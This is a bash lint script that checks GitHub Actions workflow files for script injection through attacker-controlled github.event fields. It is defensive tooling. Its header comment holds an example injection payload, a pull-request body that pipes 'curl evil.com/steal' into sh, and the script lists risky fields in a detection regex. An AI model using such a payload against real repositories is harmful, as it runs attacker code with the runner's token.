#!/usr/bin/env bash
# For every workflow yml, pin that no step interpolates attacker-
# controllable github.event fields directly via `${{ ... }}`
# syntax inside a `run:` script block.
#
# The dangerous pattern (per GitHub's own security guidance at
# https://docs.github.com/en/actions/security-guides/security-
# hardening-for-github-actions#understanding-the-risk-of-script-
# injections):
#
#   steps:
#     - name: Print PR body
#       run: |
#         echo "PR body: ${{ github.event.pull_request.body }}"
#
# GitHub Actions performs the `${{ }}` substitution BEFORE bash
# sees the script. A PR body like:
#
#   "; curl evil.com/steal | sh; #
#
# becomes literal bash code after substitution, executing with
# the runner's privileges (incl. GITHUB_TOKEN). Same vector as
# pull_request_target (gated by iter-93), but applicable to
# ANY workflow trigger because these fields are populated from
# user-controllable git event data.
#
# Attacker-controllable fields covered:
#
#   github.event.pull_request.body
#   github.event.pull_request.title
#   github.event.pull_request.head.label
#   github.event.pull_request.head.ref
#   github.event.pull_request.user.email
#   github.event.pull_request.user.name
#   github.event.issue.body
#   github.event.issue.title
#   github.event.comment.body
#   github.event.review.body
#   github.event.head_commit.message     (already attacker-set in some flows)
#   github.event.head_commit.author.name (PR-controlled in fork case)
#   github.event.head_commit.author.email
#
# Safe pattern: pass through `env:` block. GitHub passes env
# values as literal strings via the runner's environment; bash
# expands them at run time after the script is parsed, so
# they can't break out of the surrounding shell context.
#
#   env:
#     PR_BODY: ${{ github.event.pull_request.body }}
#   run: |
#     echo "PR body: $PR_BODY"
#
# The env-passthrough form ALSO produces unquoted-variable
# bugs (bash word-splitting if not quoted) but those are
# detectable by shellcheck. Direct `${{ }}` interpolation in
# scripts is undetectable by static shell analysis because the
# substitution happens before the shell parser runs.
#
# Detection: grep for the literal field names with the
# `${{ ... }}` brace pattern. Comments containing the field
# names as documentation get false-flagged; the gate accepts
# that low rate (workflows rarely document attacker-controlled
# fields verbatim).
#
# 90/90 workflow files green at iter-112 add — security-critical
# regression floor against script-injection introduction.
set -uo pipefail
root="$(cd "$(dirname "$0")/.." && pwd)"
cd "$root" || exit
ok=1

# Pattern: `${{ github.event.<container>.<attacker-field> }}`.
# Matched containers: pull_request, issue, comment, review,
# head_commit. Matched fields: body, title, name, email, label,
# ref, message, author.
risky_re='\$\{\{ *github\.event\.(pull_request(\.head|\.user)?|issue|comment|review|head_commit(\.author)?)\.(body|title|name|email|label|ref|message) *\}\}'

checked=0
risky_hits=0

while IFS= read -r wf; do
    [[ -f "$wf" ]] || continue
    checked=$((checked + 1))

    while IFS= read -r match; do
        ln_num="${match%%:*}"
        line="${match#*:}"
        echo "FAIL  $wf:$ln_num: script-injectable github.event interpolation in run: block — $line"
        risky_hits=$((risky_hits + 1))
        ok=0
    done < <(grep -nE "$risky_re" "$wf" 2>/dev/null || true)
done < <(find . -path './.git' -prune \
    -o -path '*/grammars/sources/*' -prune \
    -o -path '*/_deps/*' -prune \
    -o -path '*/libs/JUCE/*' -prune \
    -o -path '*/clap-libs/*' -prune \
    -o -path '*/clap-juce-extensions/*' -prune \
    -o -path '*/node_modules/*' -prune \
    -o -path '*/vendor/*' -prune \
    -o -path '*/target/*' -prune \
    -o -path '*/third_party/*' -prune \
    -o -type f -path '*/.github/workflows/*.yml' -print 2>/dev/null)

echo "---"
echo "Summary: $checked workflow files checked, $risky_hits attacker-controllable field interpolations"

[[ $ok -eq 1 ]] && exit 0 || exit 1
